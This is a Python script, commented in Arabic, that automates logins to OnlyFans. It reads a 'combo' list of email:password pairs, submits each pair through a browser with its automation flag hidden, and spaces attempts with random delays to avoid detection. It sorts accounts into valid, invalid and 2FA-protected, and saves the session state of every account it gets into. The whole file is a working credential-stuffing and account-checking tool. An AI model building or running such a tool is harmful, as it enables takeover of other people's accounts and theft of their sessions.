#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OnlyFans Auto Login - Smart Single File Script
- يقرأ ملف كومبو (email:password)
- يعبّي الإيميل والباسورد تلقائياً
- يكشف الكابتشا فقط إذا ظهرت (يحلها يدوياً)
- إذا الباسورد غلط، يتخطى الحساب فوراً
- يحفظ الجلسة لكل حساب ناجح
"""

import os
import sys
import time
import random
from datetime import datetime

from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError


# ================== الإعدادات ==================
COMBO_FILE = "accounts.txt"
SESSIONS_DIR = "./sessions"
BROWSER_DATA_DIR = "./browser_data"
RESULTS_FILE = "./results.txt"

HEADLESS = False
PAGE_TIMEOUT = 30000
CAPTCHA_WAIT = 300        # ثواني انتظار حل الكابتشا يدوياً
LOGIN_CHECK_TIMEOUT = 15  # ثواني لفحص نتيجة الدخول
DELAY_MIN = 20
DELAY_MAX = 60
MAX_RETRIES = 2


# ================== دوال مساعدة ==================
def log(msg, level="INFO"):
    symbols = {"INFO": "[*]", "OK": "[+]", "FAIL": "[-]", "WARN": "[!]", "SKIP": "[~]"}
    ts = time.strftime("%H:%M:%S")
    print(f"{symbols.get(level, '[*]')} [{ts}] {msg}", flush=True)


def read_combo(filepath):
    if not os.path.exists(filepath):
        log(f"ملف الكومبو غير موجود: {filepath}", "FAIL")
        sys.exit(1)

    creds = []
    with open(filepath, "r", encoding="utf-8") as f:
        for i, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                log(f"تخطي السطر {i}: لا يوجد ':'", "WARN")
                continue
            email, password = line.split(":", 1)
            email, password = email.strip(), password.strip()
            if email and password:
                creds.append((email, password))
    return creds


def save_session(context, email):
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    safe = email.replace("@", "_at_").replace(".", "_").replace("/", "_")
    path = os.path.join(SESSIONS_DIR, f"session_{safe}.json")
    context.storage_state(path=path)
    log(f"تم حفظ الجلسة: {path}", "OK")
    return path


def append_result(email, status):
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    line = f"{datetime.now().isoformat()} | {status} | {email}\n"
    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
        f.write(line)


# ================== فحص حالة الصفحة ==================
def detect_state(page, timeout=LOGIN_CHECK_TIMEOUT):
    """
    يفحص الصفحة ويعيد:
    'success'  → تم الدخول
    'captcha'  → كابتشا تنتظر حل يدوي
    'invalid'  → باسورد غلط أو حساب غير موجود
    '2fa'      → يحتاج كود تحقق
    'unknown'  → ما قدر يحدد (مهلة)
    """
    start = time.time()
    while time.time() - start < timeout:
        try:
            url = page.url or ""

            # ====== نجاح ======
            if "/my/" in url or url.rstrip("/").endswith("/my"):
                return "success"
            try:
                if page.locator('nav, [data-testid="sidebar"]').count() > 0:
                    return "success"
            except Exception:
                pass

            # ====== كابتشا ======
            try:
                captcha_selectors = (
                    '.cf-turnstile, '
                    'iframe[src*="challenges.cloudflare.com"], '
                    'iframe[title*="Cloudflare"], '
                    '[data-testid="captcha"], '
                    '#cf-challenge-running'
                )
                if page.locator(captcha_selectors).count() > 0:
                    return "captcha"
            except Exception:
                pass

            # ====== 2FA ======
            try:
                if page.locator(
                    'input[name="otp"], input[name="code"], '
                    'input[autocomplete="one-time-code"]'
                ).count() > 0:
                    return "2fa"
            except Exception:
                pass

            # ====== باسورد غلط ======
            try:
                bad = page.locator(
                    'text=/incorrect|invalid|wrong|not found|'
                    'does not exist|email or password/i'
                ).count()
                if bad > 0:
                    return "invalid"
            except Exception:
                pass

        except Exception:
            pass

        time.sleep(1)

    return "unknown"


def wait_for_captcha_solved(page, timeout=CAPTCHA_WAIT):
    """ينتظرك تحل الكابتشا. يعيد الحالة النهائية."""
    log("=" * 55)
    log("ACTION: ظهرت كابتشا — حلها بإصبعك على الشاشة", "WARN")
    log("البرنامج يتحقق تلقائياً كل 3 ثواني...", "WARN")
    log(f"الحد الأقصى: {timeout} ثانية", "WARN")
    log("=" * 55)

    start = time.time()
    while time.time() - start < timeout:
        state = detect_state(page, timeout=4)
        if state == "success":
            log("تم تجاوز الكابتشا والدخول بنجاح", "OK")
            return "success"
        if state == "invalid":
            log("باسورد غلط بعد الكابتشا", "FAIL")
            return "invalid"
        time.sleep(3)

    log("انتهى وقت انتظار الكابتشا", "FAIL")
    return "timeout"


# ================== تسجيل الدخول ==================
def login_account(email, password, attempt=1):
    log(f"محاولة {attempt}/{MAX_RETRIES}: {email}")

    with sync_playwright() as p:
        context = None
        try:
            user_dir = os.path.join(BROWSER_DATA_DIR, email.replace("@", "_at_"))
            os.makedirs(user_dir, exist_ok=True)

            context = p.chromium.launch_persistent_context(
                user_dir,
                headless=HEADLESS,
                channel="chrome",
                viewport={"width": 1280, "height": 720},
                locale="en-US",
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--disable-dev-shm-usage",
                    "--no-sandbox",
                    "--disable-gpu",
                ],
            )

            page = context.pages[0] if context.pages else context.new_page()
            page.set_default_timeout(PAGE_TIMEOUT)

            # 1. فتح الموقع
            log("فتح onlyfans.com ...")
            page.goto("https://onlyfans.com/", wait_until="domcontentloaded")
            time.sleep(3)

            # 2. إدخال الإيميل
            log("إدخال الإيميل...")
            page.wait_for_selector('input[name="email"]', timeout=15000)
            page.click('input[name="email"]')
            page.fill('input[name="email"]', email)
            time.sleep(1.2)

            # 3. إذا ما في حقل باسورد، اضغط NEXT
            if page.locator('input[name="password"]').count() == 0:
                log("نسخة خطوتين — الضغط على NEXT...")
                try:
                    page.click('button:has-text("NEXT")', timeout=5000)
                except Exception:
                    pass
                page.wait_for_selector('input[name="password"]', timeout=20000)
                time.sleep(1.2)

            # 4. إدخال الباسورد
            log("إدخال الباسورد...")
            page.click('input[name="password"]')
            page.fill('input[name="password"]', password)
            time.sleep(0.8)

            # تحقق إنو الباسورد انكتب
            try:
                filled = page.input_value('input[name="password"]')
                if not filled:
                    log("الباسورد ما انكتب، إعادة كتابة...", "WARN")
                    page.fill('input[name="password"]', "")
                    page.type('input[name="password"]', password, delay=40)
            except Exception:
                pass

            time.sleep(0.5)

            # 5. الضغط على LOG IN
            log("الضغط على LOG IN...")
            try:
                page.click('button:has-text("LOG IN")', timeout=5000)
            except Exception:
                page.keyboard.press("Enter")

            # 6. فحص الحالة
            time.sleep(2)
            state = detect_state(page, timeout=LOGIN_CHECK_TIMEOUT)
            log(f"الحالة بعد الدخول: {state}")

            # ====== معالجة الحالة ======
            if state == "success":
                pass

            elif state == "captcha":
                state = wait_for_captcha_solved(page)

            elif state == "invalid":
                log("باسورد غلط أو الحساب غير موجود", "FAIL")
                append_result(email, "INVALID")
                context.close()
                return "invalid"

            elif state == "2fa":
                log("الحساب محمي بـ 2FA — يحتاج كود تحقق", "WARN")
                append_result(email, "2FA")
                context.close()
                return "2fa"

            else:  # unknown
                # ممكن يكون بطيء، نفحص مرة ثانية بعد انتظار
                log("الحالة غير معروفة، انتظار إضافي...", "WARN")
                time.sleep(5)
                state = detect_state(page, timeout=10)

            # ====== النتيجة النهائية ======
            if state == "success":
                log(f"تم تسجيل الدخول بنجاح: {email}", "OK")
                save_session(context, email)
                append_result(email, "SUCCESS")
                context.close()
                return "success"
            else:
                log(f"فشل الدخول: {email} (الحالة: {state})", "FAIL")
                try:
                    safe = email.replace("@", "_at_").replace(".", "_")
                    shot = os.path.join(SESSIONS_DIR, f"debug_{safe}.png")
                    page.screenshot(path=shot)
                except Exception:
                    pass
                append_result(email, f"FAILED_{state.upper()}")
                context.close()
                return state

        except PlaywrightTimeoutError as e:
            log(f"انتهت مهلة عنصر: {e}", "FAIL")
            if context:
                try: context.close()
                except: pass
            return "timeout"

        except Exception as e:
            log(f"خطأ: {e}", "FAIL")
            if context:
                try: context.close()
                except: pass
            return "error"


# ================== الدالة الرئيسية ==================
def main():
    log("=" * 55)
    log("OnlyFans Auto Login — Smart")
    log("=" * 55)

    creds = read_combo(COMBO_FILE)
    if not creds:
        log("لا توجد حسابات صالحة", "FAIL")
        sys.exit(1)

    log(f"عدد الحسابات: {len(creds)}", "OK")
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    os.makedirs(BROWSER_DATA_DIR, exist_ok=True)

    stats = {"success": 0, "invalid": 0, "2fa": 0, "other": 0}

    for idx, (email, password) in enumerate(creds, 1):
        log(f"\n{'=' * 55}")
        log(f"الحساب {idx}/{len(creds)}: {email}")
        log("=" * 55)

        final = None
        for attempt in range(1, MAX_RETRIES + 1):
            result = login_account(email, password, attempt)

            # إذا النتيجة نهائية (نجاح / باس غلط / 2FA) → لا تعيد المحاولة
            if result in ("success", "invalid", "2fa"):
                final = result
                break

            # فقط أخطاء الشبكة أو المهلة → أعد المحاولة
            if attempt < MAX_RETRIES:
                log("إعادة المحاولة بعد 8 ثواني...", "WARN")
                time.sleep(8)
            else:
                final = result

        # ====== إحصائيات ======
        if final == "success":
            stats["success"] += 1
        elif final == "invalid":
            stats["invalid"] += 1
        elif final == "2fa":
            stats["2fa"] += 1
        else:
            stats["other"] += 1

        # ====== تأخير بين الحسابات ======
        if idx < len(creds):
            d = random.uniform(DELAY_MIN, DELAY_MAX)
            log(f"انتظار {d:.0f} ثانية قبل الحساب التالي...", "INFO")
            time.sleep(d)

    # ====== الملخص ======
    log("\n" + "=" * 55)
    log("الملخص النهائي")
    log("=" * 55)
    log(f"  نجح:              {stats['success']}", "OK")
    log(f"  باسورد غلط:      {stats['invalid']}", "FAIL")
    log(f"  يحتاج 2FA:       {stats['2fa']}", "WARN")
    log(f"  فشل آخر:         {stats['other']}", "FAIL")
    log(f"  المجموع:         {len(creds)}")
    log(f"\nالنتائج محفوظة في: {RESULTS_FILE}")
    log("=" * 55)


if __name__ == "__main__":
    main()
